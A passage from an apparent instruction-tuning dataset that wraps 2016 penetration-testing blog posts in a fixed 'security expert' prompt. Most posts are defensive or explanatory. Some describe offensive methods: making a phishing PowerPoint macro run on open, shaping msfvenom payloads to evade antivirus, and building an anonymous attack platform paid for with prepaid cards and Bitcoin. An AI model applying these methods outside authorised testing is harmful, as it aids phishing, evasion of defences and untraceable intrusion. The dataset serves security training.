certainly smash your car window in and take your entire car but that's going to attract a lot more attention possibly set off an alarm and get people calling the police We still can take the keys lock the doors and hide our money We want to make it more annoying and slightly more difficult for a thug to get what he's after Many times bad guys will get annoyed and move on to a target that requires less work because the world is full of suckers You're not a sucker so start making these small changes to the way you conduct your own information security We should think of security as many layers of protection One layer won't keep you safe but many smaller layers will keep you safer than one or none Here are 15 things to do not arranged in any particular order of importance They're ALL important Use anti-virus Yes yes yes John says to kill it But what he means is that AV alone won't do the trick It's not a set it and walk away deal It's one simple layer It won't catch everything not even close but it's still worth enabling If you're running Windows the built-in one is fine just make sure it's on Even a free one is fine Test it out by downloading the inane fake virus Eicar It's safe and does nothing but should be caught by every AV program Enable your firewall Enable full disk encryption on a Mac it's FileVault on Windows Bitlocker Make sure your passwords are long 20 characters like a sentence only you would know something like Makeupyourownpassword.Don'tusethisone And PLEASE use a password manager Don't reuse passwords Are you using a password manager People reuse passwords when they're having a hard time remembering the four billion passwords they need Stop trying and get a password manager Enable 2-step authentication Use an Adblocker in your browser Browsers have extensions you can set up in the settings So much malware ransomware comes through advertisements on websites you would otherwise trust Blacklist tell your browser what kinds of traffic aren't allowed This is especially useful if you have kids in your household who might stumble across unseemly things Set up Open DNS to help Directions at their website Make sure your network Wi-Fi is password protected with a strong password There's a good chance your mom has Wi-Fi how modern but she never put a password on it and it's open to the entire neighborhood Or it might have just the default password still Change that Treat every environment as if it's hostile You wouldn't walk up to a stranger in a coffee shop and give them your social security number and birthdate so why are you using free Wi-Fi If you must use free Wi-Fi get yourself a VPN with 2-factor authentication Or use your phone's hotspot internet Always keep your system and application updated It's too easy to ignore this when your computer alerts you but do them ASAP One word of caution if a program pops up and says I need to be updated allow don't Cancel out and visit the website directly to check Sometimes malware poses as a program you already likely have in order to get itself installed onto your system Be careful Educate yourself about phishing attacks be wary of opening attachments and links even from people whom you know If anything looks suspicious call and ask the person what they sent and if they did actually send it If someone calls you saying you have a virus on your computer and they can help you get it off HANG UP And do not ESPECIALLY DO NOT give them any kind of personal information or your credit card How many of our parents grandparents have already fallen for this scheme These people are con artists preying on the uninformed Be informed My grandma fell for this and it makes me sad Don't let this happen to yours Cover up your webcam when you're not using it It's one of the easiest things ever to turn this on remotely and watch you In general take the stance that the internet is a dangerous place We all need to go there but we don't all have to be morons when we're there Pay attention to the URLs you visit the things people ask you to download the popups You wouldn't wander into dark alleys in a city and if you found yourself there you'd be sure to be hyper-aware If someone offered you a drink in that dark alley you sure wouldn't take it would you The same goes for your life on the internet and the things people are asking you to do This might seem like an overwhelming task There might be a part of you that's tempted to just give up ignore this problem and hope it never bites you None of these things is too hard If you aren't sure how to do one ask someone Or Google it Or search around until you figure it out The best way to learn is to have a problem and try and fix it Not only will you learn more about where things are located on your computer but you'll become more familiar with it as a whole If you have learned to use a computer you can learn to be safer about using a computer More good stuff here rebsonsecurity.com tools-for-a-safer-pc"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Advanced Msfvenom Payload Generation</title>\n<taxonomies>Author, Joff Thyer, Red Team, KALI, payload generation, PEInsider, PowerShell, shellcode</taxonomies>\n<creation_date>Tue, 10 May 2016 14:07:16 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer It has been known for some time that an executable payload generated with msfvenom can leverage an alternative template EXE file and be encoded to better evade endpoint defenses Having said that what is the standard process for producing an EXE format without using an alternative template file If like many of us you are using the KALI penetration testing distribution the template files used for EXE generation are included with the Metasploit software They are located in the directory usr share metasploit-framework data templates on the current KALI distribution as of the date of this article If you generate a 32-bit EXE format for Windows the template file template_x86_windows.exe is used and if you generate a 64-bit EXE format for Windows the template file template_x64_windows.exe is used A few years back the Metasploit framework required that a template EXE file had a buffer usually 4096 bytes in length with the fixed string of PAYLOAD contained at the beginning of said buffer The template EXE files were written such that they used VirtualAlloc then a MemCpy memory copy and then called the shellcode directly after it had been copied into an executable section of memory This technique is still present in the DLL payloads but is no longer present for EXE payload generation Interestingly the 64-bit payload template still has this buffer allocation contained within it even though the function of that EXE file is now irrelevant Today Metasploit msfvenom generates payloads in EXE format by placing the shellcode either directly in the .text section of the PE COFF file or creating a new random executable section name and playing the shellcode into that new section Then the code entry point address is modified to point at the new code and the EXE file is saved Thus by using this technique almost any executable file can actually be used as a template There is an interesting additional command line flag to msfvenom to change the format to exe-only rather than exe This flag has the effect of either creating a new section header or modifying the existing .text section in the case of 64-bit binaries In the case of 32-bit binaries the shellcode ends up in the .text section regardless however the characteristics flags differ and some extra assembly code are introduced in the exe-only version What does this all mean Well frankly this gives us additional mechanisms and possibilities to evade endpoint defenses as we leverage the idea of both modifying the PE COFF section headers and using a well-known binary such as write.exe or notepad.exe for the template I took a deeper look at the 64-bit case as it seems that endpoint defenses are not quite as adept at firing signatures on Metasploit 64-bit binaries To examine the differences I used a program called PEInsider which allows us to view the structure of the PECOFF file These are the two different msfvenom commands I used to generate the binary files Notice the -f exe versus -f exe-only flags In both cases above we use the Windows file of write.exe as the template rather than Metasploit's standard template file Taking a look with the PEInsider program we can see that in the first case EXE a new section header is added with a random name and the code entry point adjusted to hex 6000 In the second case EXE-ONLY the existing .text section is modified Also in both cases the section containing the shellcode is marked as writeable in addition to the standard flags of executable readable and contains code 64-bit Payload Using the -f exe Flag 64-bit Payload Using the -f exe-only Flag Why is this interesting Well it appears that in the past folks in the penetration testing community have been overly focused on using shellcode encoding as a potential detection evasion technique This is a bit of a fallacy as the standard Metasploit template itself is a dead giveaway regardless of the shellcode contained within and more to the point encoding shellcode was historically more about fitting the payload to the environmental conditions rather than evasion ie what if an input buffer cannot accept a specific character Secondly it has been my experience that the endpoint defense vendors do a pretty good job of picking up 32-bit payloads but have fallen somewhat short with respect to 64-bit payloads Not surprisingly most environments are solidly running 64-bit systems today which means we all should not ignore the 64-bit attack surface and defense requirements Using either a unique template EXE or something that is a legitimate O S binary along with potentially leveraging different PE COFF output formats yields opportunities for evasion In addition defenders should be cognizant of the fact that multiple 64-bit binary formats are possible In particular some carefully crafted YARA rules could assist in finding unusual payloads especially those with E0000020 as the characteristics flags on the .text section indicating that the writable flag is set versus 60000020 which is a more normal setting for flags set on the .text section While it is tempting to always use the new sexy PowerShell goodness what is old can be new again and result in a very effective and successful evasion technique In fact the new PowerShell techniques are where the attention and focus on endpoint defenses now lie It is important to keep a diverse set of tricks and deep grab bag of tools that you just might need"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Browser Plugin Oversharing</title>\n<taxonomies>Author, Brian King, InfoSec 201, browser plug-ins, browsers, privacy, security, they're watching, wappalyzer</taxonomies>\n<creation_date>Wed, 11 May 2016 14:46:14 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian King Do you know what that browser plugin is doing There's a browser plugin for just about everything You can find one to change the name of your least-favorite politician into something offensive on every page you visit There are malware blockers and password managers Gail covered one to make PGP a little easier not too long back on this very blog The thing they all do though is they operate inside your browser The web browser may well have displaced the medical exam room on the list of places where it's hardest to hide something Even when you want to do something privately online when you delete your cookies or use incognito mode or a search engine that promises not to track you you still use a browser to find what you're looking for Your browser is in a position to know an awful lot about you and plugins can know anything the browser knows So when you find one that looks helpful it's worth a look to see what it's actually doing with all the information you make available to it Sometimes they do more than you'd expect On webapp tests I sometimes use one called Wappalyzer to quickly identify what third-party components are involved in a website It shows logos in the address bar to tell you what it's found Look at all that stuff from the newspaper The installation page describes in general what the plugin does and links to a FAQ The last question in the FAQ tells you that the extension sends anonymous information about websites you visit to wappalyzer.com and describes pretty clearly what that information is and what it's used for You had to know it would do something like that And you can opt out so it's all on the up and up so far Anyhow I wondered what exactly might get sent back to them and whether that might include confidential information about the sites I test for our customers So did some aimless browsing on both public sites and internal sites on my own network while capturing traffic in BurpSuite As I went I noticed occasional POST requests to a Wappalyzer URL that had a single large JSON object in the postdata Hey what's all that Speaking of plugins there's one called JSBeautifier for BurpSuite which makes that kind of data far more readable Decoded post data This accurately shows that I was on Reddit and clicked a link that took me to Walmart It also doesn't include the actual path I was on at either location which is in line with their description This doesn't say exactly what I was looking at in either place but it does say where I started where I went and when I did it startTime is a Unix epoch timestamp Farther down it shows the full URLs to some components Some of these are the things it's looking for to show me with those icons in the address bar Most are generic URLs but some have random-looking strings in them which may or may not be user-specific Above Some generic JS my browser picked up from Google Above A less-generic URL to doubleclick That doubleclick.net URL is 1 580 characters long and it includes some pretty specific information about me including my physical location down to the ZIP code probably by reverse IP lookup the web browser I'm using a few parameters that are GUIDs globally-unique identifiers which could be specific to me or not and the full URL of the page I was on at Walmart at the time That's a full URL This contradicts what Wappalyzer says in their FAQ appalyzer.com faq Wappalyzer FAQ Excerpt Now given how deeply that was buried and that the thing they collected was not a URL I actively visited but one that was added by a tracker on a site that I visited this may be an oversight on Wappalyzer's part But it pretty clearly does include a full URL and enough other information to fairly uniquely identify me visited hosts ZIP code timestamp and browser user-agent And then we have those GUIDs which may or may not identify me alone The other question was about non-public sites I'd visit I often test sites on a customer's intranet or sites that are only available by VPN or otherwise shouldn't be publicly disclosed How could Wappalyzer possibly identify those and exclude them Their FAQ doesn't mention this at all so my assumption was that these more sensitive locations wouldn't get any special treatment And it turned out that even the most obviously not public site of all localhost is included in the message Internal Site Included This one doesn't include any real path information that string of digits doesn't point to anything on my localhost web server But it does disclose the internal hostname the date time I visited it and the fact that it exists All of that may be more than a customer would like me to reveal to a third party My takeaways from this little exercise I need to remove this plugin before testing anything non-public The privacy measures described in the FAQ are not completely in force Browser plugins sit in a very privileged place and should be chosen with great care"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>What's trust among schoolchildren: Kerberos Authentication Explained</title>\n<taxonomies>InfoSec 201, 3 headed dog from gates of hell, authentication protocol, first crush, handwritten notes, Kerberos, kerberos authentication, Windows Active Directory</taxonomies>\n<creation_date>Fri, 13 May 2016 14:37:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Logan Lembke Kerberos authentication can be daunting but is an important protocol to understand for any IT professional and especially important in the field of information security While you may not hear about Kerberos often you probably have heard about its largest implementation Windows Active Directory Since Windows 2000 Kerberos has been the default network authentication protocol for users within a domain In practice Kerberos allows network authentication to take place without putting the user's password or a hash of that password onto the network In doing so it protects users against a vast array of snooping attacks that could otherwise capture the user's credentials The three headed dog who guards hell there's a reason they chose the scariest mascot possible One source of confusion regarding Kerberos comes from its different implementations In the 1980's MIT invented the Kerberos authentication protocol By the 1990's version 4 of the protocol became an IETF standard and Microsoft began implementing its own version into Windows 2000 In 2005 version 5 of the MIT protocol replaced the previous IETF standard As of now Microsoft Kerberos currently follows version 5 of the IETF standard however Microsoft has made some small changes Kerberos as designed by MIT is an authentication protocol However when Microsoft implemented Kerberos they chose to add authorization systems to the protocol as well As you can imagine these authorization systems have been under constant attack Primarily these systems have been used during post-exploitation of a domain controller in order to gain further access to network resources While the protocol may seem overwhelming the core concept is easy enough that schoolchildren could take advantage of it In fact they do Your first crush Imagine you're out at recess and you see your crush and their best friend You would really like to ask your crush to go get some ice cream with you but you can't work up the nerve to ask Thankfully you've talked to their friend before so you wait for them to split up momentarily That way you can talk to your mutual friend alone Right as you begin talking to them the bell rings and you're forced to go inside Drats Your friend tells you that they'll send you a note during class so you can finish your conversation Once class starts you receive a note from your crush's mutual friend asking you what you wanted to talk about Childhood Notes More Secrets Passed than Symmetric Key Encryption You tell them it's about your crush and that you would like them to ask your crush out for you Rather than ask your crush for you directly your friend comes up with a clever idea Your friend says that they wrote a convincing letter to your crush but that you'll have to deliver the note yourself Theres one other catch you can't read the note Your friend tells you that they'll ruin the whole thing on purpose if you look You hesitate but in the end you go along with the plan You figure it'll work since your crush generally trusts your mutual friend While you still need to talk to your crush you can now casually leave the note on their desk without bringing up the topic Better than nothing you think After you leave the note on their desk you go outside and wait for their response Suddenly your crush comes through the door asking you about your favorite kind of ice cream The note worked It seems your friend successfully helped you connect Lets recap You began talking with your friend in the open Your friend gave you a note so you could continue to talk with them You asked your friend to ask your crush out for you Rather than ask them out for you directly they wrote a note for you You left the note for your crush Your crush trusted the opinion of your mutual friend and began to read the note Your crush thought about getting ice cream with you Your crush decided to get ice cream with you On the surface Kerberos works exactly like these love stricken schoolchildren In this scenario you are the user the domain controller is your friend and the desired service is your crush A user asks the local domain controller to talk in the open The domain controller gives the user a key so the user can continue to talk to it The user asks the domain controller for access to a service The domain controller creates a note for the user to give to the service The user gives the service the domain controller's note The service trusts the contents of the note from the domain controller The service matches the user's information against the domain controller's note The service authenticates the user While this explanation is fine for a cursory overview of the subject further explanation is needed for a deep understanding of the topic After searching the internet for a few hours watching videos and reading papers I have found a few resources which I highly recommend How the Kerberos Version 5 Authentication Protocol Works by Microsoft TechNet If you want to put your nose to the grindstone Microsoft has laid out its version of Kerberos in a 2009 TechNet article The article is one or two steps removed from the RFC's which specify the protocol but it does a fine job explaining where Microsoft has altered the protocol in order to speed up operations or to provide authorization facilities Additionally it provides a step-by-step explanation of the authentication process Kerberos In the Crosshairs Golden Tickets Silver Tickets MITM and More SANS continues to impress with their explanation of Microsoft Kerberos Hands down SANS presents the best functional explanation of Microsoft's implementation of the Kerberos protocol with a specific slant towards security professionals Beyond explaining the authentication process the article also touches on the exploits currently available for Microsoft's Kerberos implementation Overpass the Hash Golden Tickets Silver Tickets and MITM attacks Abusing Kerberos by Skip Duckwall and Benjamin Delpy Video PDF Duckwall and Delpy provide an in depth look at the vulnerabilities involved with Microsoft Kerberos authentication Mimikatz a tool written by Benjamin Delpy for the post-exploitation of a domain controller using Kerberos is demoed throughout the presentation While this is a great presentation I would recommend reading the SANS article first since the talk shows working demos of almost every exploit mentioned in the SANS post above All in all Kerberos while overwhelming can be made simple by taking a step back and viewing it at a higher level Once you understand the basics of the protocol a large pool of knowledge will become available to you as an information technology professional With knowledge of Kerberos system admins can begin securing their networks and security professionals can begin learning about the vulnerabilities inherent in the protocol There's no need to be afraid of that big bad dog after all"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Phishing with PowerPoint</title>\n<taxonomies>Carrie Roberts, Phishing, Red Team, autorun, penetration testing, pentest, Pentesting, phishing, social engineering</taxonomies>\n<creation_date>Mon, 16 May 2016 14:55:44 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Chevy Swanson How do we make sure people open up our malicious files and execute them We simply let Microsoft work for years and years to gain people's trust then we throw some dangerous macros into a powerpoint and people will actually have a smile on their face as they open it This other great blog post goes into more detail on the macros themselves and how to evade antivirus This blog post ads a trick to get the macro to run as soon as the file is open without requiring additional user action such as clicking or generating a mouseover event This is a hack needed specifically for Powerpoint because it does not provide an Auto_Open or Workbook_Open option like Microsoft Word and Excel provide This blog post will cover how to get your macro to run as as soon as they enable macros via a nice little warning banner at the top of their screen First things first we need to open our powerpoint presentation and add the DEVELOPER Tab if it isn't already there In the developer tab click the Visual Basic button on the far left and that will open up a new window Next go to Insert Module and here you can add in your macros For this example we will open a message box Or if you just want to copy the text for yourself Sub Run_On_Open MsgBox Run_On_Open just ran End Sub Of course if this had been an actual malicious attempt you would have put your antivirus evading payload here instead as shown in Sally's blog post Save the powerpoint as a .pptm file and close it for now Now there is the fast way and the barely slower way to do these next few steps The fast way being the use of a program called CustomUI Editor which you can find a tutorial on how to use it for this purpose here We can't recommend the use of any random .msi file so instead we are going to go through the more manual option First you will want to unzip the powerpoint file into its own directory then you will need to edit the _rels .rels file to add this line right before the last Target customUI customUI.xml Id Rd6e72c29d34a427e Next you will need to create a new directory on the same level as the _rels directory Create a file named customUI.xml in this new directory and add the following text onLoad Run_On_Open Zip your files back up If you are on a mac make sure you exclude the .DS_store files zip -r newRunOnOpen.pptm -x .DS_Store Make sure you name it with a .pptm extension since the powerpoint must be able to load the custom ribbon we created Your macros should now run upon opening of the powerpoint once you enable macros"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The Rejected Box - An Ode to IT Professionals</title>\n<taxonomies>Fun & Games, building a cabin in the woods, IT people are awesome, John's grunge hair, John's sister, rotting animals in a well, Thinking outside the box, throwback family posts</taxonomies>\n<creation_date>Fri, 20 May 2016 13:22:28 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Melisa Wachs Hello IT professional If you haven't heard it lately I hope you know that you're really amazing You're probably helping laymen like me all day long Maybe you were explaining simple encryption or sending out a phishing warning or just updating software Perhaps you don't feel appreciated so today I want to give a sincere thanks See I'm not one to be able to grasp the abstract The very idea that electricity can be harnessed moved and stored is a mystery to me This fascination is not just with computers I give the same amazement to anyone who fully understands stocks bonds IRAs or 401ks Where is the actual money people Working at BHIS where penetration testers are the face of who we are not the back-end in the basement I've noticed a common thread among you and probably most IT professionals You seem to have rejected simple answers boundaries or directions This doesn't necessarily mean you're a rebel like John was What I'm saying is that at some point you found yourself in a box The non-rebel may just say fine give me a box but I'll define it on my own terms Thus perhaps you took that box used that definition to your advantage and made yourself a rhombus when everyone else made squares Still a quadrilateral but now it's your quadrilateral The World Wanted You to be Bob and Bob Alone John tried to destroy the boxes handed to him and argued with anyone who tried to close the lid on him Mr Sam above and he would have really gotten along He definitely got this trait from our father out of pure necessity As children our parents stumbled upon an old cabin out in the middle of nowhere It was isolated 40 minutes from civilization the well at times filled with rotting animals we'd only find after our stomachs turned with the smell and we had no entertainment but dirt bikes and raspberry patches It was a dream childhood in many ways I really wish the rotting animal part was a joke This cabin became our permanent home after an addition and remodel we did ourselves Our father taught us how to continually bend our boxes How after all do you build a home that isolated We adapted But for me all that physical work makes sense I can see a ceiling doesn't need to be lowered but a floor that needs to be raised instead I can't see how the IT world works This is what I find amazing about you It often seems that you work on a different world where the gravity is different and the languages are foreign Being on calls with our team or listening to IT conversations is intimidating It's like I'm a five-year old in France watching beautiful people drink good wine and laugh dismissively at me as I ask where the potty is Thank you for being the crazy non-box Bob but the wild quadrilateral you are Here's one last zoom in for you to check out John's 90s grunge hair I'm not sure what he's holding but it sure looks like a toilet seat that's rejected its own rules of conformity On a final note if you catch John at a conference ask him about our dad chainsaw bay window And...the squirrel"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Nessus & Nmap</title>\n<taxonomies>Red Team, Red Team Tools, Nessus, Nmap</taxonomies>\n<creation_date>Wed, 18 May 2016 13:46:27 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sally Vandeven In a recent conversation with Paul Asadoorian he mentioned a Nessus plugin called nmapxml He was not sure how well it worked but suggested I try it out The plugin allows you to import Nmap scan results for Nessus to use in the discovery phase of a scan The discovery phase of a Nessus scan occurs at the beginning when Nessus is trying to discover which hosts are alive as well as which services and operating systems are running on those hosts that will require vulnerability testing But Nessus has a built-in port service scanner you say right Yes you are absolutely correct but since Nmap specializes in port scanning and service OS fingerprinting maybe it would do an even better job than its Nessus cousin Well I am an unashamed Nmap fan girl for sure so I was convinced that adding Nmap to the mix would dramatically improve the accuracy of our Nessus findings and hopefully reduce some false positives With that in mind I decided to take this plugin for test drive and this is what I found .Importing Nmap scanning results provides NO improvement in fingerprinting or service discovery You can actually stop reading here if you want But if you are curious about how this process went read on And by all means if you have experimented with this plugin and have had better results please drop me a note and tell me about it The process went something like this Step 1 Grab the NASL file from tatic.tenable.com documentation nmapxml.nasl Step 2 Place the NASL file in the plugins folder of your Nessus installation cp nmapxml.nasl opt nessus lib nessus plugins Step 3 Stop the Nessus service sudo etc init.d nessusd stop Step 4 Install the new plugin cd opt nessus sbin sudo nessusd -y to install the new plugin Step 5 Restart the Nessus service sudo etc init.d nessusd start Step 6 Run an Nmap scan of your target network nmap -A -oX nmap-output.xml iL targets.txt -A means include OS and version detection and allow NSE script scanning and traceroute -oX means write the output file in XML format -iL means take the list of targets to scan from the file targets.txt with the format 10.11.12.13 10.11.12.14 172.16.24.0 24 192.168.100-125 Step 7 Configure Nessus to use your Nmap results in the Discovery phase Step 8 Run your Nessus scan using the newly updated policy that includes the Nmap scan results That's really all there is to it After comparing the results with and without the Nmap file the results were basically identical After three scan attempts and some tweaking of the Nmap scanning options the only differences I found were very minor and probably due to other network congestion The differences did not significantly impact the fingerprinting or service detection So why even bother writing about such unexciting results For two reasons First because just in case this sounded promising to you and you had also put it on your TO DO list I thought I would save you the time And second because this is what we do so much of the time .try something only to find that it does not work the way we had hypothesized But the good news is that we learn things in the process which is exactly why I love this work I plan to experiment with this some more for example IPv6 fingerprinting and if I learn anything interesting I'll be sure to post it here"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>You Down With APP? (Yeah You Know Me)</title>\n<taxonomies>Author, Derek Banks, General InfoSec Tips & Tricks, InfoSec 201, anonymous, Any job that involves a burner phone is a great job, cash, hacking, nuke it all afterwards, red teaming, white hat hacking</taxonomies>\n<creation_date>Wed, 25 May 2016 15:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Derek Banks Yes I date myself with reference in the title of this blog post I can be lame like that A fair amount of my time at last_gig was spent analyzing the Tools Techniques and Procedures of the Advanced Persistent Threat Now as a pentester I have often thought about applying some of those techniques What if I had to create a burnable and unattributable attack platform for a specific type of engagement How would I go about it and be an Advanced Persistent Pentester This interest was renewed by my co-worker Beau Bullock's talk at B-Sides Orlando on Fade from WhiteHat to Black and also by a client that wanted us to do a black box assessment as if we were actual attackers trying not to get caught Now obviously this isn't going to be the in the same league as a nation state with deep financial pockets It probably isn't even the same game But it is an interesting exercise nonetheless and for those redteam times when you want decrease your potential digital footprint this may help give you some ideas Where possible I am not going to repeat instructions that can be found elsewhere online such as how to make a bootable USB drive Afterall that's what the Internet is for right Also the obligatory warning that this configuration should not be used for attempting to hack systems that you are not authorized to Nothing is unattributable and untrackable it can just be made less so If you perform illegal activities it is my belief that maintaining perfect OpSec is incredibly difficult and you will get caught if the full weight of law enforcement comes after you So don't do stupid stuff that will get you into trouble What we will need Cash for buying all the stuff we need and mostly not getting tracked Laptop and USB flash drive for loading the OS Prepaid phone needed for registering email addresses or other accounts Prepaid VISA cards for converting to Bitcoin BTC Virtual Private Server that takes Bitcoin VPS Cash How much That depends I already owned a Lenovo t420 and opted to use it but found almost the same system without SSD drives for 250 on Craigslist With the laptop my total cost would have been 423.69 Smartphone Obtain a burner phone Note that 7-11 never seems to have them in stock I went to three before giving up and going to Walmart The cost for a Tracfone Alcatel OnePlus was 63.79 with a 120 minute plan card there was a special that tripled the minutes It seemed that the activation required WiFi to configure Android but it may work to activate at Tracfone.com prior to setting up the phone so the 4G connection is set up If connecting to WiFi consider connecting to a public network Obviously this was my first Tracfone Mainly this will be used for SMS messages for account verification but hey having a burner phone should come in handy maybe for Defcon I guess Note that the email address that I created with Google during setup will not be used other than for the phone registration There are a few reasons for that Laptop Setup This section isn't meant to be how to create a perfectly secure and anonymous laptop for long term use There are other resources for that I've been reading How to Setup a High-Security Laptop for Hacking Privacy Self-Protection and Deep Web Voyaging Using Kali Linux 2.0 VirtualBox Whonix Obfuscated Bridges Tor Dark Net Science Book 1 which has been interesting but we're not going that far in this post Our OS will be burned after the engagement due to the Ripley Doctrine Take off and nuke the entire site from orbit It's the only way to be sure Any data that will need to be kept after the engagement will need to be consolidated from local and and archived in some manner Afterall if I were an actual attacker I'd attempt to stand up new infrastructure for every campaign and burn it when it was over Purchase a laptop off of craigslist I found a close configuration to the Lenovo t420 that I already own for 250 Keep it cheap we're running Linux and you want it to be a few years old it will work better I chose Ubuntu 14.04 LTS as the OS because I know it works very well with the Lenovo t420 I know I know Ubuntu 14.04 comes out of the box with some privacy concerns We're going to makes some changes to that I realize the choice of Ubuntu may make some folks say that or that other distro is a much better choice for what you're doing here That may be the case our industry is full of caveats that make people stay up late at bars at conferences arguing the pros and cons and starting flame wars on the Internet I like Ubuntu because it tends to work better for me Download the ISO verify the checksum and make a bootable install drive out of the USB stick Instructions are easily found online for any platform so I will not repeat them During the installation process select to encrypt the installation Choose as long as a security key as you as you can remember Continue with the default installation When it is time to select the computer host name and username select what you feel is appropriate but I would suggest your normal names or handles are not what you want here Use something generic and inconspicuous Once booted into the new installation update it apt-get update apt-get upgrade apt-get install git Next we will set up some pentesting tools Use git to clone TrustedSec's PTF project git clone ithub.com trustedsec ptf.git Change into ptf and run PTF cd ptf ptf Once in the framework ptf use modules install_update_all This takes a while but when complete will have current pentesting tools in pentest While PTF does it's thing follow the instructions at ixubuntu.com to turn off search suggestions that may send data to a third party PTF is still installing so I suggest going to get a password manager to generate and keep long passwords I like Keypass but as long as the key store is kept local it should be ok As you need to create passwords for various resources generate long random passwords If PTF is still installing go get some coffee check back on it in a bit It will need you to answer some questions take the defaults Take this time to change the DNS server entry in resolv.conf to point to Google's DNS or any DNS server that is not your ISP Next install Virtual Box Download and create VMs for Kali and Tails Install Tor Browser on the native Ubuntu install Most work will happen in the VMS but I like the flexibility of having tools natively available as well Lastly go get Burp Suite The free version may work for you if just to proxy your web traffic when necessary The full version is totally worth it but would add 350 to the cost and I am pretty sure they do not take Bitcoin Zed attack proxy may work for your purposes as well Next register a Yahoo email account Why Because using a mail client with Yahoo not the web interface will let you send malicious payloads through it in case you need to send targeted phishing messages and are able to make your ruse work with the Yahoo address This should provide a solid and flexible platform for a laptop as a base attack platform to get started with Virtual Private Server Setup Now we need a VPS on the Internet for our testing platform We will use it to VPN through as well as hosting listeners for command and control But first we need a way to pay for it that is somewhat more anonymous than a credit card or Paypal How about Bitcoin I would never say that I am a cryptocurrency expert by any stretch of the imagination but it seemed that BTC wasn't necessarily intended to be anonymous But it seems more so than other payment options for sure There were two ways that some Googling provided to obtain Bitcoins anonymously Locally meeting someone and giving them cash Prepaid VISA Card Local Bitcoin traders seemed to have a 1BTC minimum at the time of this writing that was 450 much more that we need for a month or two a VPS and past my comfort zone for an experiment I picked up two 50 Vanilla branded cards at a local drugstore about a mile from my house Not exactly anonymous since I also went to my bank's ATM right next door to pull out the cash I was most certainly on video at the ATM and in the drugstore But it was unattributable enough for the test Not every BTC market place accepted prepaid VISA cards as a payment method After some research paxful.com provides the means to do so with a few brands of cards After creating an account choose the brand of gift card that you have Mine was listed prominently on the page You will be purchasing BTC from another individual through the paxful market The cost of BTC in this method will be approximately .77 on the dollar and it fluctuations a few cents The two transactions for this test required pictures of the front and back of the card If these were taken with a smartphone as mine were do not forget to remove the exif data exiftool -all .jpg Once enough BTC has been obtained for the duration of the operation then it is time to set up the VPS LibertyVPS ibertyvps.net allows OpenVPN in their terms of service and is hosted in the Netherlands Create an account and order the cheapest server When checking out select the Bitcoin option When you initiate the transaction since your BTC wallet is not on the local system but on paxful.com transfer the amount to LiberyVPS from the paxful.com wallet The checkout window on LiberyVPS will hang but the transaction will complete SSH should be live on the VPS after creation Once connected we will do the same as with the laptop update the server and install git and PTF Why install the same tools on the client and the server Well there are a lot of tools there Better to set up what you may need now than get into the middle of something later and realize you should have installed it OpenVPN I followed the instructions from ww.digitalocean.com community tutorials 